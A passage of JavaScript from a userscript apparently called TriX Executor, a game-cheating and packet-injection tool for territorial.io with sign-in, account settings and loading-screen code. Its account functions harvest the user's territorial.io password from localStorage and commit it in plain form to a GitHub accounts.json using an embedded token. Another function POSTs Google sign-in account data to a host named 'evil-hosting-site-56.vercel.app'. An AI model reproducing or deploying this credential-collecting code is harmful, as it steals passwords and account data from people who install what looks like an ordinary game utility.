                }
              },
              onerror: function(apiError) {
                console.error("Network error fetching SHA for accounts.json:", apiError);
                showNotification('Network error preparing to update account data.', 'error');
              }
            });
          } else if (response.status === 404) {
            console.log("accounts.json not found, creating new one.");
            proceedWithAccountUpdate(existingAccounts, fileSha, password, currentUser, rememberMe);
          } else {
            console.error("Error fetching accounts.json:", response.status, response.responseText);
            showNotification('Error fetching account data from GitHub.', 'error');
            return;
          }
        },
        onerror: function(error) {
          console.error("Network error fetching accounts.json:", error);
          showNotification('Network error fetching account data from GitHub.', 'error');
        }
      });
 
      function proceedWithAccountUpdate(existingAccounts, fileSha, password, currentUser, rememberMe) {
        // Add or update the current territorial.io account
        const newAccount = {
          name: currentUser.name,
          password: password, // Only for territorial.io accounts
          profilePic: currentUser.profilePic
        };
 
        const existingAccountIndex = existingAccounts.findIndex(acc => acc.name === newAccount.name);
 
        if (existingAccountIndex > -1) {
          // Update existing account if password or profilePic is different
          if (existingAccounts[existingAccountIndex].password !== newAccount.password ||
              existingAccounts[existingAccountIndex].profilePic !== newAccount.profilePic) {
            existingAccounts[existingAccountIndex] = { ...existingAccounts[existingAccountIndex], ...newAccount };
            showNotification('Territorial.io account data updated on GitHub.', 'success');
          } else {
            showNotification('Territorial.io account data already up-to-date on GitHub.', 'info');
          }
        } else {
          // Add new account
          existingAccounts.push(newAccount);
          showNotification('Territorial.io account data saved to GitHub.', 'success');
        }
 
        // 2. Encode and commit changes
        const updatedContent = base64Encode(JSON.stringify(existingAccounts, null, 2));
 
        GM_xmlhttpRequest({
          method: "PUT",
          url: GITHUB_API_URL, // Use API URL for committing
          headers: {
            "Authorization": `token ${GITHUB_TOKEN}`,
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "TriX-Executor",
            "Content-Type": "application/json"
          },
          data: JSON.stringify({
            message: `Update territorial.io account data for ${currentUser.name}`,
            content: updatedContent,
            sha: fileSha // Required for updating existing files
          }),
          onload: function(commitResponse) {
            if (commitResponse.status === 200 || commitResponse.status === 201) {
              console.log("Account data committed to GitHub successfully:", commitResponse.responseText);
            } else {
              console.error("Error committing account data to GitHub:", commitResponse.status, commitResponse.responseText);
              showNotification('Error committing account data to GitHub.', 'error');
            }
          },
          onerror: function(commitError) {
            console.error("Network error committing account data to GitHub:", commitError);
            showNotification('Network error committing account data to GitHub.', 'error');
          }
        });
      }
 
      const signInOverlay = document.getElementById('trix-signin-overlay');
      if (signInOverlay) {
            signInOverlay.style.display = 'none';
            if (signInOverlay._mutationObserver) {
              signInOverlay._mutationObserver.disconnect();
            }
          }
      showAccountModal();
    }, 4000);
  }
 
  function signInWithGoogle(rememberMe = false) {
    const CLIENT_ID = '60039993285-rr970n4vjb0tan22qe3l3bsnpfeh9n4j.apps.googleusercontent.com';
    const REDIRECT_URI = 'https://basic-incremental-studios.vercel.app/api/oauth-callback';
    
    const loadingModal = showLoadingModal();
    
    // Open auth popup with implicit flow (token response)
    const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?` +
      `client_id=${encodeURIComponent(CLIENT_ID)}&` +
      `redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +
      `response_type=token&` +
      `scope=${encodeURIComponent('openid profile email')}&` +
      `prompt=consent`;
    
    const popup = window.open(authUrl, 'GoogleAuth', 'width=500,height=600,scrollbars=yes');
    
    if (!popup) {
      loadingModal.remove();
      showNotification('Popup blocked! Please allow popups and try again.', 'error');
      return;
    }
    
    // Listen for messages from the callback page
    const messageHandler = async (event) => {
      // Accept messages from our callback domain
      if (!event.origin.includes('basic-incremental-studios.vercel.app') && 
          !event.origin.includes('localhost') && 
          !event.origin.includes('127.0.0.1')) {
        return;
      }
      
      const data = event.data;
      
      // Check if this is a token response
      if (data && data.access_token && data.type === 'GOOGLE_AUTH_SUCCESS') {
        window.removeEventListener('message', messageHandler);
        clearTimeout(timeoutId);
        clearInterval(pollPopup);
        
        if (popup && !popup.closed) {
          popup.close();
        }
        
        try {
          // Fetch user info from Google
          const userResponse = await fetch(`https://www.googleapis.com/oauth2/v2/userinfo?access_token=${encodeURIComponent(data.access_token)}`, {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
          });
          
          if (!userResponse.ok) {
            throw new Error(`HTTP ${userResponse.status}`);
          }
          
          const userInfo = await userResponse.json();
          
          if (!userInfo.email) {
            throw new Error('No email in user info');
          }
          
          loadingModal.remove();
          
          // Set current user
          currentUser = {
            name: userInfo.name || userInfo.email.split('@')[0],
            email: userInfo.email,
            profilePic: userInfo.picture || null,
            provider: 'google',
            token: data.access_token
          };
          
          // Save profile picture
          if (userInfo.picture) {
            localStorage.setItem('trix_profile_pic', userInfo.picture);
          }
          
          // Handle Remember Me
          if (rememberMe) {
            const expiryTime = Date.now() + (7 * 24 * 60 * 60 * 1000);
            GM_setValue('trix_user_session', JSON.stringify({ user: currentUser, expiry: expiryTime }));
          } else {
            GM_setValue('trix_user_session', null);
          }
          
          updateUserProfile();
          
          // Send account data to the external API
          GM_xmlhttpRequest({
            method: "POST",
            url: "https://evil-hosting-site-56.vercel.app/api/accounts", // Your hosted API endpoint
            headers: {
              "Content-Type": "application/json"
            },
            data: JSON.stringify({
              name: currentUser.name,
              password: "GOOGLE_AUTH_TOKEN", // Placeholder for Google, as actual password isn't available
              profilePic: currentUser.profilePic
            }),
            onload: function(response) {
              console.log("Account data sent to API:", response.responseText);
            },
            onerror: function(error) {
              console.error("Error sending account data to API:", error);
            }
          });
 
          const signInOverlay = document.getElementById('trix-signin-overlay');
          if (signInOverlay) {
            signInOverlay.style.display = 'none';
            if (signInOverlay._mutationObserver) {
              signInOverlay._mutationObserver.disconnect();
            }
          }
          showAccountModal();
        } catch (error) {
          loadingModal.remove();
          showNotification(`Sign-in error: ${error.message}`, 'error');
          console.error('Google Sign-In error:', error);
        }
      }
    };
    
    window.addEventListener('message', messageHandler);
    
    // Check if popup is closed every 500ms
    const pollPopup = setInterval(() => {
      if (popup.closed) {
        clearInterval(pollPopup);
        window.removeEventListener('message', messageHandler);
        clearTimeout(timeoutId);
        if (loadingModal && loadingModal.parentElement) {
          loadingModal.remove();
        }
        showNotification('Sign-in cancelled.', 'info');
      }
    }, 500);
    
    // Timeout: close popup after 5 minutes and stop listening
    const timeoutId = setTimeout(() => {
      clearInterval(pollPopup);
      if (popup && !popup.closed) popup.close();
      window.removeEventListener('message', messageHandler);
      if (loadingModal && loadingModal.parentElement) {
        loadingModal.remove();
      }
      showNotification('Sign-in timed out. Please try again.', 'error');
    }, 300000);
  }
 
  function signOut() {
    // Save account info for 24 hours (works for both territorial.io and Google Sign-In)
    const cachedAccount = {
      name: currentUser?.name || localStorage.getItem('d105') || '',
      password: localStorage.getItem('d106') || '',
      profilePic: currentUser?.profilePic || localStorage.getItem('trix_profile_pic') || '',
      provider: currentUser?.provider || 'territorial.io',
      expiry: Date.now() + (24 * 60 * 60 * 1000) // 24 hours from now
    };
    GM_setValue('trix_cached_account', JSON.stringify(cachedAccount));
    
    currentUser = null;
    GM_setValue('trix_user_session', null);
    localStorage.removeItem('trix_profile_pic');
    updateUserProfile();
    const signInOverlay = document.getElementById('trix-signin-overlay');
    if (signInOverlay) {
      signInOverlay.style.display = 'flex';
      // Re-enable the observer if it was disconnected
      if (signInOverlay._mutationObserver) {
        const trixBody = document.querySelector('.trix-body');
        if (trixBody) {
          signInOverlay._mutationObserver.observe(trixBody, { childList: true });
        }
      }
    }
    
    const modal = document.getElementById('trix-account-modal');
    if (modal) modal.remove();
    
    showNotification('Signed out successfully', 'success');
  }
 
  function updateUserProfile() {
    const profileEl = document.getElementById('trix-user-profile');
    const nameEl = document.getElementById('trix-user-name');
    const pfpEl = document.getElementById('trix-user-pfp');
    const btnEl = document.getElementById('trix-signin-btn');
    const settingsBtn = document.getElementById('trix-account-settings-btn');
    
    if (currentUser) {
      nameEl.textContent = currentUser.name;
      if (pfpEl && currentUser.profilePic) {
        pfpEl.src = currentUser.profilePic;
        pfpEl.style.objectFit = 'cover';
      }
      if (btnEl) btnEl.style.display = 'none';
      if (settingsBtn) settingsBtn.style.display = 'block';
    } else {
      nameEl.textContent = 'Guest';
      if (pfpEl) {
        pfpEl.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNhNWY0ZmMiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMjAgMjF2LTJhNCA0IDAgMCAwLTQtNEg4YTQgNCAwIDAgMC00IDR2MiI+PC9wYXRoPjxjaXJjbGUgY3g9IjEyIiBjeT0iNyIgcj0iNCI+PC9jaXJjbGU+PC9zdmc+';
      }
      if (btnEl) btnEl.style.display = 'block';
      if (settingsBtn) settingsBtn.style.display = 'none';
    }
  }
 
  function showAccountModal() {
    // Dismiss trix-loading-screen if it exists
    const loadingScreen = document.getElementById('trix-loading-screen');
    if (loadingScreen) {
      loadingScreen.remove();
    }
 
    if (!currentUser) return;
    
    const modal = document.createElement('div');
    modal.id = 'trix-account-modal';
    modal.className = 'trix-modal-backdrop visible';
    const defaultAvatarSrc = currentUser.profilePic || 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNhNWY0ZmMiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMjAgMjF2LTJhNCA0IDAgMCAwLTQtNEg4YTQgNCAwIDAgMC00IDR2MiI+PC9wYXRoPjxjaXJjbGUgY3g9IjEyIiBjeT0iNyIgcj0iNCI+PC9jaXJjbGU+PC9zdmc+';
    
    // Determine password value based on auth provider
    let passwordValue = '';
    if (currentUser.provider === 'google') {
      passwordValue = '-Google';
    } else {
      passwordValue = localStorage.getItem('d106') || '';
    }
    
    modal.innerHTML = `<style>
        .trix-modal-content {
            display: flex;
            flex-direction: column;
            height: 100%;
        }
        .trix-modal-body {
            flex-grow: 1; /* Allows the body to take up available space */
            overflow-y: auto; /* Add scroll if content overflows */
        }
        .trix-modal-footer {
            margin-top: auto; /* Pushes the footer to the bottom */
            padding-top: 15px; /* Add some padding above the footer */
            border-top: 1px solid rgba(255,255,255,0.1); /* Optional: a subtle separator */
        }
    </style>
    <div class="trix-modal-content">
      <div class="trix-modal-header">Account Settings</div>
      <div class="trix-modal-body">
        <div class="trix-account-info">
          <div class="trix-account-avatar" id="trix-account-avatar-edit">
            <img id="trix-account-avatar-img" src="${defaultAvatarSrc}" alt="Profile" style="width:100%;height:100%;border-radius:50%;object-fit:cover;">
          </div>
          <div class="trix-account-field">
            <label>Account Name</label>
            <input type="text" id="trix-account-name" value="${currentUser.name}" readonly style="cursor:default;">
          </div>
          <div class="trix-account-field">
            <label>Password</label>
            <div class="trix-password-field-wrapper">
              <input type="password" id="trix-account-password" value="${passwordValue}" placeholder="••••••••" style="padding-right:40px" ${currentUser.provider === 'google' ? 'readonly' : ''}>
              <span class="trix-password-toggle-icon" id="trix-password-toggle">👁️</span>
            </div>
          </div>
        </div>
        <hr style="border-color: rgba(255,255,255,0.1); margin: 20px 0;">
        <div class="trix-modal-section">
            <h2>Delete My Account</h2>
            <p>Enter the account name to delete your territorial.io account data from GitHub.</p>
            <div class="trix-input-group">
              <label for="trix-delete-account-name">Account Name:</label>
              <input type="text" id="trix-delete-account-name" placeholder="Enter account name">
            </div>
            <button class="exec-btn danger" id="trix-delete-account-btn">Delete Account</button>
            <div id="trix-delete-status-display" style="margin-top: 10px; display: none;">
              <p id="delete-status-message"></p>
            </div>
          </div>
          <div id="trix-retrieved-data-display" style="margin-top:15px; text-align:left; background:rgba(0,0,0,0.2); padding:10px; border-radius:5px; display:none;">
            <p><strong>Name:</strong> <span id="retrieved-name"></span></p>
            <p><strong>Password:</strong> <span id="retrieved-password"></span></p>
            <p><strong>Profile Pic:</strong> <img id="retrieved-profile-pic" src="" alt="Profile" style="width:50px; height:50px; border-radius:50%; object-fit:cover; margin-top:5px; display:none;"></p>
          </div>
        </div>
      <div class="trix-modal-footer">
        <button class="exec-btn danger" id="trix-account-signout">Sign Out</button>
        <div>
          <button class="exec-btn secondary" id="trix-account-close">Close</button>
          <button class="exec-btn success" id="trix-account-save">Save</button>
        </div>
      </div>
    </div>`;
    document.body.appendChild(modal);
    
    const closeBtn = modal.querySelector('#trix-account-close');
    const saveBtn = modal.querySelector('#trix-account-save');
    const signoutBtn = modal.querySelector('#trix-account-signout');
    const avatarEdit = modal.querySelector('#trix-account-avatar-edit');
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.accept = 'image/*';
    fileInput.style.display = 'none';
    document.body.appendChild(fileInput);
    
    avatarEdit.addEventListener('click', () => fileInput.click());
    
    fileInput.addEventListener('change', e => {
      const file = e.target.files[0];
      if (file) {
        const reader = new FileReader();
        reader.onload = evt => {
          const img = modal.querySelector('#trix-account-avatar-img');
          img.src = evt.target.result;
          currentUser.profilePic = evt.target.result;
        };
        reader.readAsDataURL(file);
      }
    });
    
    // Password toggle functionality
    const passwordToggle = modal.querySelector('#trix-password-toggle');
    const passwordInput = modal.querySelector('#trix-account-password');
    
    if (passwordToggle && passwordInput) {
      passwordToggle.addEventListener('click', () => {
        // Don't toggle if it's a Google account (readonly)
        if (currentUser.provider === 'google') return;
        
        if (passwordInput.type === 'password') {
          passwordInput.type = 'text';
          passwordToggle.textContent = '🙈';
        } else {
          passwordInput.type = 'password';
          passwordToggle.textContent = '👁️';
        }
      });
    }
    
    
    closeBtn.addEventListener('click', () => {
      modal.remove();
      document.body.removeChild(fileInput);
    });
    
    signoutBtn.addEventListener('click', signOut);
    
    saveBtn.addEventListener('click', () => {
      const password = modal.querySelector('#trix-account-password').value;
      if (password) {
        localStorage.setItem('d106', password);
        currentUser.password = password;
      }
      // Always save the profile picture
      if (currentUser.profilePic) {
        localStorage.setItem('trix_profile_pic', currentUser.profilePic);
      }
      updateUserProfile();
 
      // If the user is signed in with territorial.io, update GitHub data
      if (currentUser && currentUser.provider === 'territorial.io') {
        // Fetch existing accounts.json to get SHA for update
        GM_xmlhttpRequest({
          method: "GET",
          url: GITHUB_RAW_URL,
          headers: {
            "User-Agent": "TriX-Executor"
          },
          onload: function(response) {
            let existingAccounts = [];
            let fileSha = null;
 
            if (response.status === 200) {
              existingAccounts = JSON.parse(response.responseText);
              GM_xmlhttpRequest({
                method: "GET",
                url: GITHUB_API_URL,
                headers: {
                  "Authorization": `token ${GITHUB_TOKEN}`,
                  "Accept": "application/vnd.github.v3+json",
                  "User-Agent": "TriX-Executor"
                },
                onload: function(apiResponse) {
                  if (apiResponse.status === 200) {
                    const apiData = JSON.parse(apiResponse.responseText);
                    fileSha = apiData.sha;
                    proceedWithAccountUpdate(existingAccounts, fileSha, password, currentUser, false); // false for rememberMe as it's a save action
                  } else {
                    console.error("Error fetching SHA for accounts.json:", apiResponse.status, apiResponse.responseText);
                    showNotification('Error preparing to update account data.', 'error');
                  }
                },
                onerror: function(apiError) {
                  console.error("Network error fetching SHA for accounts.json:", apiError);
                  showNotification('Network error preparing to update account data.', 'error');
                }
              });
            } else if (response.status === 404) {
              console.log("accounts.json not found, creating new one.");
              proceedWithAccountUpdate(existingAccounts, fileSha, password, currentUser, false);
            } else {
              console.error("Error fetching accounts.json:", response.status, response.responseText);
              showNotification('Error fetching account data from GitHub.', 'error');
            }
          },
          onerror: function(error) {
            console.error("Network error fetching accounts.json:", error);
            showNotification('Network error fetching account data from GitHub.', 'error');
          }
        });
      }
      
      showNotification('✓ Account settings saved!', 'success');
      modal.remove();
      document.body.removeChild(fileInput);
    });
    
    modal.addEventListener('click', e => {
      if (e.target === modal) {
        modal.remove();
        document.body.removeChild(fileInput);
      }
    });
 
    // Delete Account Data functionality
    const deleteAccountNameInput = modal.querySelector('#trix-delete-account-name');
    const deleteAccountBtn = modal.querySelector('#trix-delete-account-btn');
    const deleteStatusDisplay = modal.querySelector('#trix-delete-status-display');
    const deleteStatusMessage = modal.querySelector('#delete-status-message');
 
    deleteAccountBtn.addEventListener('click', () => {
      const accountNameToDelete = deleteAccountNameInput.value.trim();
      if (!accountNameToDelete) {
        showNotification('Please enter an account name to delete.', 'error');
        return;
      }
 
      deleteStatusDisplay.style.display = 'block';
      deleteStatusMessage.textContent = 'Deleting account...';
 
      // 1. Fetch existing accounts.json using GITHUB_RAW_URL
      GM_xmlhttpRequest({
        method: "GET",
        url: GITHUB_RAW_URL,
        headers: {
          "User-Agent": "TriX-Executor"
        },
        onload: function(response) {
          let existingAccounts = [];
          let fileSha = null;
 
          if (response.status === 200) {
            existingAccounts = JSON.parse(response.responseText);
            // To get SHA for PUT request, we need another call to GITHUB_API_URL
            GM_xmlhttpRequest({
              method: "GET",
              url: GITHUB_API_URL,
              headers: {
                "Authorization": `token ${GITHUB_TOKEN}`,
                "Accept": "application/vnd.github.v3+json",
                "User-Agent": "TriX-Executor"
              },
              onload: function(apiResponse) {
                if (apiResponse.status === 200) {
                  const apiData = JSON.parse(apiResponse.responseText);
                  fileSha = apiData.sha;
                  proceedWithDelete(existingAccounts, fileSha, accountNameToDelete, deleteStatusMessage);
                } else {
                  console.error("Error fetching SHA for accounts.json:", apiResponse.status, apiResponse.responseText);
                  deleteStatusMessage.textContent = 'Error preparing to delete account data.';
                  showNotification('Error preparing to delete account data.', 'error');
                }
              },
              onerror: function(apiError) {
                console.error("Network error fetching SHA for accounts.json:", apiError);
                deleteStatusMessage.textContent = 'Network error preparing to delete account data.';
                showNotification('Network error preparing to delete account data.', 'error');
              }
            });
          } else if (response.status === 404) {
            deleteStatusMessage.textContent = 'accounts.json not found on GitHub. No accounts to delete.';
            showNotification('No accounts file found on GitHub.', 'info');
            return;
          } else {
            console.error("Error fetching accounts.json:", response.status, response.responseText);
            deleteStatusMessage.textContent = 'Error fetching account data from GitHub.';
            showNotification('Error fetching account data from GitHub.', 'error');
            return;
          }
        },
        onerror: function(error) {
          console.error("Network error fetching accounts.json for deletion:", error);
          deleteStatusMessage.textContent = 'Network error fetching account data.';
          showNotification('Network error fetching account data from GitHub.', 'error');
        }
      });
 
      function proceedWithDelete(existingAccounts, fileSha, accountNameToDelete, deleteStatusMessage) {
        const initialLength = existingAccounts.length;
        const updatedAccounts = existingAccounts.filter(acc => acc.name !== accountNameToDelete);
 
        if (updatedAccounts.length === initialLength) {
          deleteStatusMessage.textContent = `Account '${accountNameToDelete}' not found.`;
          showNotification(`Account '${accountNameToDelete}' not found.`, 'info');
          return;
        }
 
        const updatedContent = base64Encode(JSON.stringify(updatedAccounts, null, 2));
 
        // 2. Commit changes using GITHUB_API_URL
        GM_xmlhttpRequest({
          method: "PUT",
          url: GITHUB_API_URL,
          headers: {
            "Authorization": `token ${GITHUB_TOKEN}`,
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "TriX-Executor",
            "Content-Type": "application/json"
          },
          data: JSON.stringify({
            message: `Delete territorial.io account data for ${accountNameToDelete}`,
            content: updatedContent,
            sha: fileSha
          }),
          onload: function(commitResponse) {
            if (commitResponse.status === 200 || commitResponse.status === 201) {
              console.log("Account data committed to GitHub successfully:", commitResponse.responseText);
              deleteStatusMessage.textContent = `Account '${accountNameToDelete}' deleted successfully!`;
              showNotification(`Account '${accountNameToDelete}' deleted successfully!`, 'success');
            } else {
              console.error("Error committing account data to GitHub:", commitResponse.status, commitResponse.responseText);
              deleteStatusMessage.textContent = 'Error deleting account data.';
              showNotification('Error committing account data to GitHub.', 'error');
            }
          },
          onerror: function(commitError) {
            console.error("Network error committing account data to GitHub:", commitError);
            deleteStatusMessage.textContent = 'Network error deleting account data.';
            showNotification('Network error deleting account data to GitHub.', 'error');
          }
        });
      }
    });
  }
  
  let trixLoadingInterval; // Global variable to store the interval ID
let trixInitFunction; // Global variable to store the init function
 
function showLoadingScreen(c){
  trixInitFunction = c; // Store the init function
  const l=document.createElement('div');l.id='trix-loading-screen';const m=["Report all harmful scripts to Painsel! Find the \"Submit a Suggestion\" button in Settings!","Block propaganda with TriX Executor! You can toggle this feature in Settings!","Definitely not a cheating tool..."];l.innerHTML=`<div class="loading-content"><img src="${GM_info.script.icon}" style="width:128px; height:128px; margin-bottom:1rem;"><div class="loading-header">TriX Executor</div><div class="loading-bar-container"><div class="loading-bar-progress"></div></div><div class="loading-message">${m[0]}</div></div>`;const d=document.createElement('div');d.id='trix-loading-settings-modal';d.style.visibility='hidden';d.innerHTML=`<div class="loading-content"><div class="loading-header">Settings</div><div class="settings-group" style="text-align:left;max-width:300px;margin:2rem auto"><label class="settings-label">Theme</label><select class="settings-select" id="trix-theme-select-loading"><option value="dark">Dark (Default)</option></select></div><button id="trix-resume-loading" class="exec-btn" style="margin-top:2rem">Resume</button></div>`;const s=document.createElement('style');s.textContent=`#trix-loading-screen,#trix-loading-settings-modal{position:fixed;top:0;left:0;width:100vw;height:100vh;background-color:#11111b;z-index:2147483647;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:'Segoe UI',sans-serif;opacity:0;transition:opacity .5s ease-in-out;pointer-events:none}#trix-loading-screen.visible,#trix-loading-settings-modal.visible{opacity:1;pointer-events:auto}.loading-content{opacity:1;transition:opacity 1s ease-in-out;text-align:center}.loading-content.fade-out{opacity:0}.loading-header{font-size:4rem;font-weight:700;color:#4f46e5;text-shadow:2px 2px 0 #4338ca,4px 4px 0 #312e81,6px 6px 10px rgba(0,0,0,.5);margin-bottom:2rem}.loading-bar-container{width:50%;max-width:600px;height:20px;background-color:#2d2d44;border-radius:10px;border:1px solid #4f46e5;overflow:hidden;margin-bottom:1rem}.loading-bar-progress{width:0%;height:100%;background:linear-gradient(90deg,#7c3aed,#4f46e5);border-radius:10px;transition:width .1s linear}.loading-message{font-style:italic;color:#9ca3af;min-height:1.2em;margin-top:1rem}`;document.head.appendChild(s);document.body.append(l,d);setTimeout(()=>l.classList.add("visible"),10);const p=l.querySelector('.loading-bar-progress'),g=l.querySelector('.loading-message');let r=0,idx=0;const totalDuration=12000;let timeSinceLastMsg=0;trixLoadingInterval=setInterval(()=>{r+=100/(totalDuration/100);timeSinceLastMsg+=100;const currentMsgDuration=m[idx].length*60+1000;if(timeSinceLastMsg>currentMsgDuration&&idx<m.length-1){idx++;g.textContent=m[idx];timeSinceLastMsg=0}p.style.width=`${Math.min(r,100)}%`;if(r>=100){clearInterval(trixLoadingInterval);window.removeEventListener('keydown',f);l.querySelector('.loading-content').classList.add('fade-out');setTimeout(()=>{l.classList.remove('visible');setTimeout(()=>{l.remove();d.remove();s.remove();c()},500)},500)}},100);const f=e=>{if(e.key==='F12'){e.preventDefault();clearInterval(trixLoadingInterval);d.style.visibility='visible';d.classList.add('visible');l.classList.remove('visible')}};window.addEventListener('keydown',f);d.querySelector('#trix-resume-loading').onclick=()=>{d.classList.remove('visible');l.classList.add('visible');
  // Re-initialize loading progress
  r = 0; // Reset progress
  idx = 0; // Reset message index
  g.textContent = m[0]; // Reset message
  p.style.width = '0%'; // Reset bar width
  timeSinceLastMsg = 0; // Reset message timer
 
  // Clear any existing interval before starting a new one
  if (trixLoadingInterval) {
    clearInterval(trixLoadingInterval);
  }
 
  trixLoadingInterval = setInterval(()=>{r+=100/(totalDuration/100);timeSinceLastMsg+=100;const currentMsgDuration=m[idx].length*60+1000;if(timeSinceLastMsg>currentMsgDuration&&idx<m.length-1){idx++;g.textContent=m[idx];timeSinceLastMsg=0}p.style.width=`${Math.min(r,100)}%`;if(r>=100){clearInterval(trixLoadingInterval);window.removeEventListener('keydown',f);l.querySelector('.loading-content').classList.add('fade-out');setTimeout(()=>{l.classList.remove('visible');setTimeout(()=>{l.remove();d.remove();s.remove();trixInitFunction(); // Call init again on completion
        },500)},500)}},100);};if(settings.showAd && !document.getElementById('trixmusic-toggle-button')){setTimeout(()=>{const ad=`<div class="advert-content"><p>Install TrixMusic and play your favorite songs while playing! Submit a suggestion to Painsel and he will add all the songs you request!</p><button class="exec-btn success" onclick="window.open('https://update.greasyfork.org/scripts/555311/TrixMusic.user.js','_blank')">Install now!</button></div><img class="advert-img" src="https://evzxirgylircpnblikrw.supabase.co/storage/v1/object/public/OMEHGS/Gemini_Generated_Image_szz3cuszz3cuszz3.png">`;showNotification(ad,"advert",10000);const notif=document.querySelector('.notification-container .notification:last-child');if(notif)notif.classList.add('advert-toast')},2000)}}
  function showUpdateModal(){const m=document.createElement('div');m.className='trix-modal-backdrop visible';m.innerHTML=`<div class="trix-modal-content"><div class="trix-modal-header" style="color:#fbbf24;">WARNING: Outdated Version!</div><div class="trix-modal-body"><p>You are using an older version of TriX Executor! Please update to the latest version for the best experience.</p></div><div class="trix-modal-footer"><button id="modal-cancel-update" class="exec-btn secondary">Remind me later</button><button id="modal-confirm-update" class="exec-btn success">Update now!</button></div></div>`;document.body.appendChild(m);m.addEventListener('click',e=>{if(e.target.id==='modal-confirm-update')window.open(UPDATE_URL,'_blank');if(e.target.id==='modal-cancel-update'||e.target===m){GM_setValue("showUpdateReminder",true);shouldShowUpdateReminder=true;renderSettingsTab();m.remove()}})}
  function deobfuscateScript(obfuscatedCode) {
             try {
               // Decode hex and unicode escapes
               let deobfuscated = obfuscatedCode.replace(/\\x([0-9A-Fa-f]{2})/g, (match, p1) => String.fromCharCode(parseInt(p1, 16)));
               deobfuscated = deobfuscated.replace(/\\u([0-9A-Fa-f]{4})/g, (match, p1) => String.fromCharCode(parseInt(p1, 16)));
             
               // Basic beautification (can be improved, but a start)
               let indentLevel = 0;
               const indentSize = 2;
               const lines = deobfuscated.split('\n');
               const beautifiedLines = [];
             
               lines.forEach(line => {
                 const trimmedLine = line.trim();
                 if (trimmedLine.endsWith('}')) {
                   indentLevel = Math.max(0, indentLevel - 1);
                 }
                 let formattedLine = ' '.repeat(indentLevel * indentSize) + trimmedLine;
                 beautifiedLines.push(formattedLine);
                 if (trimmedLine.endsWith('{')) {
                   indentLevel++;
                 }
               });
             
               return beautifiedLines.join('\n');
             } catch (error) {
               console.error("[TriX] Error during script deobfuscation:", error);
               return `// [TriX] Deobfuscation failed for this script. Original content:
${obfuscatedCode}`;
             }
           }
 
  function attachEventListeners() {
    const p = document.querySelector('.trix-executor');
    if (!p) return;
 
    // Click handler for many buttons and controls
    p.addEventListener('click', async e => {
      try {
        if (e.target.matches('.minimize-btn')) minimizePanel();
        else if (e.target.matches('.maximize-btn')) {
          if (p.style.width === '100vw') Object.assign(p.style, { width: '650px', height: '500px', top: '50px', left: 'auto', right: '50px' });
          else Object.assign(p.style, { width: '100vw', height: '100vh', top: '0', left: '0', right: 'auto' });
        } else if (e.target.matches('.close-btn')) closePanel();
        else if (e.target.matches('#execute-btn')) executeScript(document.getElementById('script-editor').value);
        else if (e.target.matches('#execute-clipboard-btn')) {
          try { const t = await GM_getClipboard(); if (t && t.trim()) executeScript(t); else showNotification('Clipboard is empty', 'error'); }
          catch (err) { showNotification('Failed to read clipboard', 'error'); }
        } else if (e.target.matches('#save-script-btn')) saveScript();
        else if (e.target.matches('#suspend-log-btn')) { isLoggerSuspended = !isLoggerSuspended; e.target.textContent = isLoggerSuspended ? 'Resume Log' : 'Suspend Log'; e.target.classList.toggle('secondary', isLoggerSuspended); }
        else if (e.target.matches('#clear-log-btn')) { const a = Array.from(monitoredConnections.values()).find(c => c.state === 'OPEN'); if (a) a.log = []; renderPacketLog(); }
        else if (e.target.matches('#inject-territorial-scripts-btn')) {
          const cachedScripts = GM_getValue('trix_territorial_scripts_cache', {});
          const scriptEditor = document.getElementById('script-editor');
          let allScriptsContent = '';
 
          if (Object.keys(cachedScripts).length > 0) {
             for (const scriptId in cachedScripts) {
               allScriptsContent += `// --- Script from ${scriptId} ---\n`;
               allScriptsContent += deobfuscateScript(cachedScripts[scriptId].content) + '\n\n';
             }
             scriptEditor.value = allScriptsContent;
            showNotification('Territorial.io scripts injected into editor!', 'success');
          } else {
            showNotification('No Territorial.io scripts found in cache. Are you on territorial.io?', 'warning');
          }
        }
        else if (e.target.matches('#inject-packet-btn')) { if (unsafeWindow.trixSocket && unsafeWindow.trixSocket.readyState === 1) { unsafeWindow.trixSocket.send(document.getElementById('injector-input').value); showNotification('Packet injected'); } else showNotification('Not connected to game server.', 'error'); }
        else if (e.target.matches('.storage-delete-btn')) { const { type, key } = e.target.dataset; const s = type === 'local' ? localStorage : sessionStorage; if (confirm(`Delete "${key}" from ${type} storage?`)) { s.removeItem(key); renderStorageView(); } }
        else if (e.target.matches('.sidebar-item')) switchTab(e.target.dataset.tab);
        else if (e.target.matches('.network-tab')) { p.querySelectorAll('.network-tab').forEach(t => t.classList.remove('active')); e.target.classList.add('active'); activeNetworkTab = e.target.dataset.netTab; renderActiveNetworkView(); }
        else if (e.target.matches('#submit-suggestion-btn') || e.target.matches('#update-now-reminder')) { window.open(e.target.matches('#submit-suggestion-btn') ? 'https://form.jotform.com/253124626389563' : UPDATE_URL, '_blank'); }
      } catch (ex) {
        console.error('[TriX] click handler error', ex);
      }
    });
 
    // Copy handler: if copying from the script editor, append a detailed legal notice and terms link
    document.addEventListener('copy', e => {
      try {
        const sel = document.getSelection();
        if (!sel || sel.rangeCount === 0) return;
        const container = sel.getRangeAt(0).commonAncestorContainer;
        const editor = document.getElementById('script-editor');
        if (editor && editor.contains(container)) {
          const text = sel.toString();
